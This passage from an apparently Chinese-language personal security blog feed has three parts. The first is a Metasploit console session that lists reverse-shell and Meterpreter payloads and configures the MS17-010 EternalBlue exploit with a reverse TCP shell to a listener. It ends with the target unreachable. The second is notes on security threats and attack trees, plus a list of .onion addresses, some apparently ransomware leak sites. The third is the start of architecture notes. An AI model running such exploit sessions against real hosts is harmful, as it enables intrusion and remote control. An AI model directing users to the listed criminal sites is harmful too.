x64)<br>   27  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;reverse_named_pipe                      normal  No     Windows Inject Reflective PE Files, Windows x64 Reverse Named Pipe (SMB) Stager<br>   28  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;reverse_tcp                             normal  No     Windows Inject Reflective PE Files, Windows x64 Reverse TCP Stager<br>   29  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;reverse_tcp_rc4                         normal  No     Windows Inject Reflective PE Files, Reverse TCP Stager (RC4 Stage Encryption, Metasm)<br>   30  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;reverse_tcp_uuid                        normal  No     Windows Inject Reflective PE Files, Reverse TCP Stager with UUID Support (Windows x64)<br>   31  payload&#x2F;windows&#x2F;x64&#x2F;pingback_reverse_tcp                             normal  No     Windows x64 Pingback, Reverse TCP Inline<br>   32  payload&#x2F;windows&#x2F;x64&#x2F;powershell_bind_tcp                              normal  No     Windows Interactive Powershell Session, Bind TCP<br>   33  payload&#x2F;windows&#x2F;x64&#x2F;powershell_reverse_tcp                           normal  No     Windows Interactive Powershell Session, Reverse TCP<br>   34  payload&#x2F;windows&#x2F;x64&#x2F;powershell_reverse_tcp_ssl                       normal  No     Windows Interactive Powershell Session, Reverse TCP SSL<br>   35  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;bind_ipv6_tcp                              normal  No     Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager<br>   36  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;bind_ipv6_tcp_uuid                         normal  No     Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager with UUID Support<br>   37  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;bind_named_pipe                            normal  No     Windows x64 Command Shell, Windows x64 Bind Named Pipe Stager<br>   38  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;bind_tcp                                   normal  No     Windows x64 Command Shell, Windows x64 Bind TCP Stager<br>   39  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;bind_tcp_rc4                               normal  No     Windows x64 Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)<br>   40  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;bind_tcp_uuid                              normal  No     Windows x64 Command Shell, Bind TCP Stager with UUID Support (Windows x64)<br>   41  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp                                normal  No     Windows x64 Command Shell, Windows x64 Reverse TCP Stager<br>   42  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp_rc4                            normal  No     Windows x64 Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)<br>   43  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp_uuid                           normal  No     Windows x64 Command Shell, Reverse TCP Stager with UUID Support (Windows x64)<br>   44  payload&#x2F;windows&#x2F;x64&#x2F;shell_bind_tcp                                   normal  No     Windows x64 Command Shell, Bind TCP Inline<br>   45  payload&#x2F;windows&#x2F;x64&#x2F;shell_reverse_tcp                                normal  No     Windows x64 Command Shell, Reverse TCP Inline<br>   46  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;bind_ipv6_tcp                          normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager<br>   47  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;bind_ipv6_tcp_uuid                     normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager with UUID Support<br>   48  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;bind_named_pipe                        normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Bind Named Pipe Stager<br>   49  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;bind_tcp                               normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Bind TCP Stager<br>   50  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;bind_tcp_rc4                           normal  No     Windows x64 VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)<br>   51  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;bind_tcp_uuid                          normal  No     Windows x64 VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x64)<br>   52  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_http                           normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)<br>   53  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_https                          normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)<br>   54  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_tcp                            normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager<br>   55  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_tcp_rc4                        normal  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)<br>   56  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_tcp_uuid                       normal  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)<br>   57  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_winhttp                        normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)<br>   58  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_winhttps                       normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)</p><p>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set payload gengrice&#x2F;shell_reverse_tcp<br>[-] The value specified for payload is not valid.<br>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; show payloads<br>Compatible Payloads<br>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><h1 id="Name-Disclosure-Date-Rank-Check-Description-1"><a href="#Name-Disclosure-Date-Rank-Check-Description-1" class="headerlink" title="Name                                                Disclosure Date  Rank    Check  Description"></a>Name                                                Disclosure Date  Rank    Check  Description</h1><hr><p>   0   payload&#x2F;generic&#x2F;custom                                               normal  No     Custom Payload<br>   1   payload&#x2F;generic&#x2F;shell_bind_tcp                                       normal  No     Generic Command Shell, Bind TCP Inline<br>   2   payload&#x2F;generic&#x2F;shell_reverse_tcp                                    normal  No     Generic Command Shell, Reverse TCP Inline<br>   3   payload&#x2F;generic&#x2F;ssh&#x2F;interact                                         normal  No     Interact with Established SSH Connection<br>   4   payload&#x2F;windows&#x2F;x64&#x2F;exec                                             normal  No     Windows x64 Execute Command<br>   5   payload&#x2F;windows&#x2F;x64&#x2F;loadlibrary                                      normal  No     Windows x64 LoadLibrary Path<br>   6   payload&#x2F;windows&#x2F;x64&#x2F;messagebox                                       normal  No     Windows MessageBox x64<br>   7   payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager<br>   8   payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support<br>   9   payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager<br>   10  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager<br>   11  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)<br>   12  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)<br>   13  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)<br>   14  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)<br>   15  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager<br>   16  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager<br>   17  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)<br>   18  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)<br>   19  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)<br>   20  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)<br>   21  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;bind_ipv6_tcp                           normal  No     Windows Inject Reflective PE Files, Windows x64 IPv6 Bind TCP Stager<br>   22  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;bind_ipv6_tcp_uuid                      normal  No     Windows Inject Reflective PE Files, Windows x64 IPv6 Bind TCP Stager with UUID Support<br>   23  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;bind_named_pipe                         normal  No     Windows Inject Reflective PE Files, Windows x64 Bind Named Pipe Stager<br>   24  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;bind_tcp                                normal  No     Windows Inject Reflective PE Files, Windows x64 Bind TCP Stager<br>   25  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;bind_tcp_rc4                            normal  No     Windows Inject Reflective PE Files, Bind TCP Stager (RC4 Stage Encryption, Metasm)<br>   26  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;bind_tcp_uuid                           normal  No     Windows Inject Reflective PE Files, Bind TCP Stager with UUID Support (Windows x64)<br>   27  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;reverse_named_pipe                      normal  No     Windows Inject Reflective PE Files, Windows x64 Reverse Named Pipe (SMB) Stager<br>   28  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;reverse_tcp                             normal  No     Windows Inject Reflective PE Files, Windows x64 Reverse TCP Stager<br>   29  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;reverse_tcp_rc4                         normal  No     Windows Inject Reflective PE Files, Reverse TCP Stager (RC4 Stage Encryption, Metasm)<br>   30  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;reverse_tcp_uuid                        normal  No     Windows Inject Reflective PE Files, Reverse TCP Stager with UUID Support (Windows x64)<br>   31  payload&#x2F;windows&#x2F;x64&#x2F;pingback_reverse_tcp                             normal  No     Windows x64 Pingback, Reverse TCP Inline<br>   32  payload&#x2F;windows&#x2F;x64&#x2F;powershell_bind_tcp                              normal  No     Windows Interactive Powershell Session, Bind TCP<br>   33  payload&#x2F;windows&#x2F;x64&#x2F;powershell_reverse_tcp                           normal  No     Windows Interactive Powershell Session, Reverse TCP<br>   34  payload&#x2F;windows&#x2F;x64&#x2F;powershell_reverse_tcp_ssl                       normal  No     Windows Interactive Powershell Session, Reverse TCP SSL<br>   35  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;bind_ipv6_tcp                              normal  No     Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager<br>   36  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;bind_ipv6_tcp_uuid                         normal  No     Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager with UUID Support<br>   37  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;bind_named_pipe                            normal  No     Windows x64 Command Shell, Windows x64 Bind Named Pipe Stager<br>   38  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;bind_tcp                                   normal  No     Windows x64 Command Shell, Windows x64 Bind TCP Stager<br>   39  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;bind_tcp_rc4                               normal  No     Windows x64 Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)<br>   40  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;bind_tcp_uuid                              normal  No     Windows x64 Command Shell, Bind TCP Stager with UUID Support (Windows x64)<br>   41  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp                                normal  No     Windows x64 Command Shell, Windows x64 Reverse TCP Stager<br>   42  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp_rc4                            normal  No     Windows x64 Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)<br>   43  payload&#x2F;windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp_uuid                           normal  No     Windows x64 Command Shell, Reverse TCP Stager with UUID Support (Windows x64)<br>   44  payload&#x2F;windows&#x2F;x64&#x2F;shell_bind_tcp                                   normal  No     Windows x64 Command Shell, Bind TCP Inline<br>   45  payload&#x2F;windows&#x2F;x64&#x2F;shell_reverse_tcp                                normal  No     Windows x64 Command Shell, Reverse TCP Inline<br>   46  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;bind_ipv6_tcp                          normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager<br>   47  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;bind_ipv6_tcp_uuid                     normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager with UUID Support<br>   48  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;bind_named_pipe                        normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Bind Named Pipe Stager<br>   49  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;bind_tcp                               normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Bind TCP Stager<br>   50  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;bind_tcp_rc4                           normal  No     Windows x64 VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)<br>   51  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;bind_tcp_uuid                          normal  No     Windows x64 VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x64)<br>   52  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_http                           normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)<br>   53  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_https                          normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)<br>   54  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_tcp                            normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager<br>   55  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_tcp_rc4                        normal  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)<br>   56  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_tcp_uuid                       normal  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)<br>   57  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_winhttp                        normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)<br>   58  payload&#x2F;windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_winhttps                       normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)</p><p>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set payload generic&#x2F;shell_reverse_tcp<br>payload &#x3D;&gt; generic&#x2F;shell_reverse_tcp<br>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set LHOST 192.168.1…<br>LHOST &#x3D;&gt; 192.168.1.1..1<br>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt;  set RHOST 192.168.1…<br>RHOST &#x3D;&gt; 192.168…..03<br>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; show options</p><p>Module options (exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue):</p><p>   Name          Current Setti  Required  Description<br>                 ng</p><hr><p>   RHOSTS        192.168.1.103  yes       The target host(s)<br>                                          , see <a href="https://gith/">https://gith</a><br>                                          ub.com&#x2F;rapid7&#x2F;meta<br>                                          sploit-framework&#x2F;w<br>                                          iki&#x2F;Using-Metasplo<br>                                          it<br>   RPORT         445            yes       The target port (T<br>                                          CP)<br>   SMBDomain                    no        (Optional) The Win<br>                                          dows domain to use<br>                                           for authenticatio<br>                                          n. Only affects Wi<br>                                          ndows Server 2008<br>                                          R2, Windows 7, Win<br>                                          dows Embedded Stan<br>                                          dard 7 target mach<br>                                          ines.<br>   SMBPass                      no        (Optional) The pas<br>                                          sword for the spec<br>                                          ified username<br>   SMBUser                      no        (Optional) The use<br>                                          rname to authentic<br>                                          ate as<br>   VERIFY_ARCH   true           yes       Check if remote ar<br>                                          chitecture matches<br>                                           exploit Target. O<br>                                          nly affects Window<br>                                          s Server 2008 R2,<br>                                          Windows 7, Windows<br>                                           Embedded Standard<br>                                           7 target machines<br>                                          .<br>   VERIFY_TARGE  true           yes       Check if remote OS<br>   T                                       matches exploit T<br>                                          arget. Only affect<br>                                          s Windows Server 2<br>                                          008 R2, Windows 7,<br>                                           Windows Embedded<br>                                          Standard 7 target<br>                                          machines.</p><p>Payload options (generic&#x2F;shell_reverse_tcp):</p><p>   Name   Current Setting  Required  Description</p><hr><p>   LHOST  192.168.1.101    yes       The listen address (an<br>                                     interface may be specif<br>                                     ied)<br>   LPORT  4444             yes       The listen port</p><p>Exploit target:</p><p>   Id  Name</p><hr><p>   0   Automatic Target</p><p>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; exploit</p><p>[-] Handler failed to bind to 192.1…..:4444:-  -<br>[<em>] Started reverse TCP handler on 0.0.0.0:4444<br>[</em>] 192.168.1.103:445 - Using auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010 as check<br>[-] 192.168.1.103:445     - Rex::HostUnreachable: The host (192.168.1.103:445) was unreachable.<br>[<em>] 192.168.1.103:445     - Scanned 1 of 1 hosts (100% complete)<br>[-] 192.168.1.103:445 - The target is not vulnerable.<br>[</em>] Exploit completed, but no session was created.<br>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>trade and attack tree</title>
      <link href="/josyaaa/2022/05/22/how%20to%20data%20set/"/>
      <url>/josyaaa/2022/05/22/how%20to%20data%20set/</url>
      
        <content type="html"><![CDATA[<p>tor<br>onionshare<br>cwtch<br>riseup<br>tails<br><a href="https://ssd.eff.org/en"></a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>disconnect&#x2F;orivacy badger&#x2F;tor&#x2F;ublock origin</p><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><p>cwtch<br>dkim verifier<br>pidgin &amp; tor<br>riseup<br>signal<br>thunderbird</p><p>keepass<br>openPGP<br>Veracrypt</p><p>7zip<br>dangerzone<br>importexporttools hg<br>keka<br>pst-utils<br>qubes qs<br>web translate</p><p>deluge<br>seednoxes<br>Transmission</p><h1 id="set"><a href="#set" class="headerlink" title="set"></a>set</h1><p>大量数据确实很难处理，但是利用 OCR 发布将转换为纯文本来解决这个缺点，PDF&#x2F;TIFF&#x2F;RAR,PST\ZIP.OCR to set using ‘tesseract’,but people using ‘grep’ and so on.</p><p>ML:</p><ol><li>收集训练和验证</li><li>预处理</li><li>定义初级模型</li><li>训练模型</li><li>评估</li><li>改进模型</li><li>部署</li><li>操作化</li><li>运行 API</li><li>反馈loop</li></ol><h1 id="data"><a href="#data" class="headerlink" title="data"></a>data</h1><ul><li>提取成为目录并解压</li><li>OCR处理…转换为文本</li><li>MS Office 转换为纯文本</li><li>纯文本和SQL迁移</li><li>将其音译为拉丁字母</li><li>语言翻译成某种语言</li><li>加载到Elasticsearch等database中可以搜索</li><li>将01010合并到OCR，OSINT 登场</li></ul><h4 id="非授权泄露"><a href="#非授权泄露" class="headerlink" title="非授权泄露"></a>非授权泄露</h4><ul><li>暴露（exposure）：故意泄露数据信息</li><li>截获(interception)：在通信环境中，对于通信流量的截获</li><li>推理(inference)：通信量分析观察网络的通信流量模式得到信息</li><li>入侵(intrusion)：通过攻克系统的访问控制保护得到敏感数据的非授权访问</li></ul><h4 id="欺骗"><a href="#欺骗" class="headerlink" title="欺骗"></a>欺骗</h4><ul><li>冒充(masquerade)： 通过佯装成授权用户访问系统（恶意代码程序或滲透访问）</li><li>伪造(falsification)：更改或替换有效数据或虚假数据引入文件和数据库</li><li>抵赖(repudiation)：用户否认发送数据，或者用户否认接收或拥有数据</li></ul><h4 id="破坏"><a href="#破坏" class="headerlink" title="破坏"></a>破坏</h4><ul><li>失能(incapacitation)：系统可用性攻击会导致物理破坏或系统硬件的损害</li><li>损坏(corruption)：系统完整性攻击，通过恶意软件使得系统资源或服务以不期望的方式工作</li><li>阻碍(obstruction)：通过中断通信链路或更改通信控制信息来干扰通信&#x2F;对通信流量或处理器资源施加额外负担使系统过载</li></ul><h4 id="篡夺"><a href="#篡夺" class="headerlink" title="篡夺"></a>篡夺</h4><ul><li>盗用(misappropriation)：服务窃取</li><li>误用(misuse)：误用恶意代码引起&#x2F;获得对系统非授权访问的黑客造成</li></ul><p><em><strong>计算机系统资产分为：硬件、软件、数据、通信线路、网络</strong></em></p><ul><li><p>硬件：可用性威胁（采用物理或管理方面的安全措施）</p></li><li><p>软件：操作系统、实用程序、应用程序</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">软件可用性（高可用性）</span><br><span class="line">软件完整/真实性（计算机病毒及相关攻击）</span><br></pre></td></tr></table></figure><ul><li>数据：关注数据中心</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可用性：被偶然或恶意软件破坏的数据文件</span><br><span class="line">机密性：非授权读取数据库或数据文件</span><br><span class="line">完整性：安装建设过程中的问题</span><br></pre></td></tr></table></figure><ul><li>通信线路：被动攻击（窃听或监视数据传输）、主动攻击（数据流进行窜改或伪造数据流）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[被动攻击重在“组织”]:</span><br><span class="line">1、消息泄露</span><br><span class="line">2、流量分析</span><br><span class="line"></span><br><span class="line">[主动攻击重在“检测”]:</span><br><span class="line"></span><br><span class="line">1、重放（涉及被动获取数据单元并在稍后重传以产生非授权的后果）</span><br><span class="line">2、冒充（发生在一个实体假装成另一个不同实体的组合）</span><br><span class="line">3、篡改消息（合法消息的某些部分被篡改，或者消息被延迟或重新排序）</span><br><span class="line">4、拒绝服务（阻止或禁止对通信设施的正常使用或管理），“安全审计服务” “分布式拒绝服务”</span><br></pre></td></tr></table></figure><h2 id="安全涉及原则"><a href="#安全涉及原则" class="headerlink" title="安全涉及原则"></a>安全涉及原则</h2><ul><li>经济机制原则：指嵌入硬件或软件中的安全机制的设计要尽可能简单、短小</li><li>安全缺省设置原则：指访问控制应当基于许可而不是排除</li><li>绝对中介原则：指每一次访问都应当依据访问控制机制进行检查（依次检查）</li><li>开放式设计原则：指安全机制的设计应当开放而非保密</li><li>特权分离原则：限于资源的访问需要多特权因素访问</li><li>最小特权原则：指每个进程和系统用户都应当使用完成某项任务必要的最小特权集进行操作</li><li>最小共用机制原则：指在设计时应当最小化不同用户共享的功能</li><li>心理可接受性原则：</li><li>隔离原则：</li><li>封装原则：</li><li>模块化原则</li><li>分层原则</li><li>最小惊动原则</li></ul><h2 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网络攻击面</span><br><span class="line">软件攻击面</span><br><span class="line">人为攻击面</span><br></pre></td></tr></table></figure><h2 id="攻击树"><a href="#攻击树" class="headerlink" title="攻击树"></a>攻击树</h2><p>攻击树是为我们提供一个条例清洗的方法来描述系统所面临的安全威胁和系统可能收到的多种攻击,用树形结构来表示系统面临的攻击,根节点代表被攻击的目标,叶节点表示达成攻击目标的方法</p><h2 id="onion-website-address"><a href="#onion-website-address" class="headerlink" title=".onion website address"></a>.onion website address</h2><p>anewset3pcya3xvk73hj7yunuamutxxsm5sohkdi32blhmql55tvgqad.onion<br>alphvmmm27o3abo3r2mlmjrpdmzle3rykajqc5xsj7j7ejksbpsa36ad.onion<br>2cuqgeerjdba2rhdiviezodpu3lc4qz2sjf4qin6f7std2evleqlzjid.onion<br>adminavf4cikzbv6mbbp7ujpwhygnn2t3egiz2pswldj32krrml42wyd.onion<br>giphvoitymatg4cv7bxqh5dz6sn6bfscywoat4qtslztkomf5lavrayd.onion<br>kwvhrdibgmmpkhkidrby4mccwqpds5za6uo2thcw5gz75qncv7rbhyad.onion<br>3kp6j22pz3zkv76yutctosa6djpj4yib2icvdqxucdaxxedumhqicpad.onion<br>mhdehvkomeabau7gsetnsrhkfign4jgnx3wajth5yb5h6kvzbd72wlqd.onion<br>l5cjga2ksw6rxumu5l4xxn3cmahhi2irkbwg3amx6ajroyfmfgpfllid.onion<br>avaddongun7rngel.onion<br>avos2fuj6olp6x36.onion<br>dnpscnbaix6nkwvystl3yxglz7nteicqrou3t75tpcc5532cztc46qyd.onion<br>aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion<br>refwobpitin77vdsdiswr43duntv6eqw4rvphedutpaxycjdie6gg3binad.onion<br>sushlnty2j7qdzy64qnvyb6ajkwg7resd3p6agc2widnawodtcedgjid.onion<br>quantum445bh3gzuyilxdzs5xdepf3b7lkcupswvkryf3n7hgzpxebid.onion</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>大型软件架构逻辑框架</title>
      <link href="/josyaaa/2022/05/15/assign/"/>
      <url>/josyaaa/2022/05/15/assign/</url>
      
        <content type="html"><![CDATA[<p>在构建软件架构的时候，主要是三层架构：前端、业务逻辑、数据库分开 比如：高性能、高可用、高并发、可扩展、安全性…</p><p><a href="https://www.indeed.com/career-advice/career-development/cloud-architecture">大型系统的软件架构</a></p><h1 id="可扩展"><a href="#可扩展" class="headerlink" title="可扩展"></a>可扩展</h1><p>系统具有可扩展性，这个在增量的时候，可扩展可拔插就有很大需求。</p><h1 id="高性能"><a href="#高性能" class="headerlink" title="高性能"></a>高性能</h1><p>最大限度减少系统内的延迟并增加其吞吐量，（cpu&#x2F;memory&#x2F;network&#x2F;disk）and (locking，锁定位置和电流扮演的角色) and (caching)</p><ol><li>工作负载</li><li>硬件速度</li></ol><p>拥塞（算法）&#x2F; 串行（并行）&#x2F; 容量（扩展）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">实践</span><br><span class="line"></span><br><span class="line">最小化请求响应延迟</span><br><span class="line">最大化吞吐量</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">延迟：</span><br><span class="line">吞吐：</span><br><span class="line">错误：</span><br><span class="line">资源饱和度：</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">数据传输延迟/TCP connection/SSL connection : 缓存/压缩/格式</span><br><span class="line">---</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="高可靠"><a href="#高可靠" class="headerlink" title="高可靠"></a>高可靠</h1><p>系统对故障具有弹性</p><h1 id="高可用"><a href="#高可用" class="headerlink" title="高可用"></a>高可用</h1><p>在系统发生故障的时候，系统也能保持高可用</p><h1 id="安全性"><a href="#安全性" 